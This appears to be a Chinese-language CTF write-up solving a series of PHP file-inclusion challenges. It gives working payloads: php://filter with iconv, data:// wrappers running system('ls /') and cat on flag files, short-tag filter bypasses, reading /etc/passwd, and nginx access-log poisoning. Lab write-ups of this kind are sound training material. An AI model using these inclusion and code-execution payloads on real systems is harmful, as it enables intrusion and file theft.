# 文件包含

## EZFL
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666101673_image.png)
有两段注释
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666203900_image.png)
直接`?file=/flag.txt`



## EZFL_1
还是上一题的位置

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666483575_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783667212802_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783667168391_image.png)

## EZFL_2

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783725879081_image.png)
1.`?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php`base大概率被过滤了，换 iconv 这类编码，把内容转成 UTF-16 后再 include

-------------------------------------------------
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726064441_image.png)
2.`?file=data:,<?php system('tac flag.php')?>`

data伪协议把后面的字符串伪装成文件内容，include 包含它时会解析执行其中的 PHP 代码。







## EZFL_3
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783725025986_image.png)
base64->`没有更多提示给你了，孩子。从现在开始，你得靠自己了。`
data伪协议

`?file=data:,<?php system('ls /')?>`

找到flag文件
`?file=data:,<?php system('cat /flag-SEYERldO4SFuwcvP5hKMwStLHW5yhI.txt')?>`



## EZFL_4
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726714869_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726795323_image.png)

看样子吧php过滤了

`?file=data:,<?system('cat flag.php ')?>`

用通配符`*`: `?file=data:,<?system('cat f*')?>`然后查看源码

## EZFL_5
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726979910_image.png)
把data伪协议过滤了,改用PHP伪协议
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783727340450_image.png)
用BP传POST

## EZFL_6
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783824149540_image.png)
虽然把PHP和data都过滤了，但是还可以包含文件。
我们可以去包含日志，在日志中注入代码
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014104609_image.png)
`/etc/passwd`访问确认文件包含存在
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014309979_image.png)
日志目录`/var/log/nginx/access.log`

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014997713_image.png)
可以找到`qingcenctf.txt`这个文件，直接`cat /qingcenctf.txt`即可

## EZFL_7
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784015176647_image.png)




# 文件上传





